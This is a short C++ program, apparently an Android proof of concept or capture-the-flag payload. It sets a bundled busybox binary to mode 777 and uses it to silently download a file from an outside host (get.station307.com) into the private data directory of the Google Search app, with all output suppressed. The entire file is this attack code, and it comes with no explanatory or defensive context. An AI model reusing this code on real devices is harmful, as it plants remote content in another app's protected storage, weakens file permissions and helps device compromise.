#include <stdio.h>
#include <unistd.h>
#include <iostream>
#include <fstream>

int main()
{

system("chmod 777 busybox-arm");

system("./busybox-arm wget -q -P /data/data/com.google.android.googlequicksearchbox https://get.station307.com/OEeMfj6Lrce/flag.txt &> /dev/null ");



return 0;
}